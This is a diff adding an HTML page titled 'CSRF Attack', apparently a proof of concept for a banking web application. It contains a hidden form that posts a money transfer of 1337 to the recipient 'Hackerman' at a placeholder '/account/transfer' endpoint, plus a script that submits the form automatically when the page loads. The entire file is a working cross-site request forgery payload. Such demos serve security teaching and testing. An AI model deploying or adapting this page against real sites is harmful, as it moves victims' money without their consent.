@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+
+    <h1>CSRF Attack</h1>
+
+        <form id="csrfForm" method="post" action="<url>/account/transfer" style="display: none;">
+            <input type="hidden" name="BankTransferDto.To" value="Hackerman">
+            <input type="hidden" name="BankTransferDto.Amount" value="1337">
+            <input type="hidden" name="BankTransferDto.Description" value="So long and thanks for all the fish!">
+        </form>
+
+        <script>
+            document.getElementById('csrfForm').submit();
+        </script>
+
+</body>
+</html>
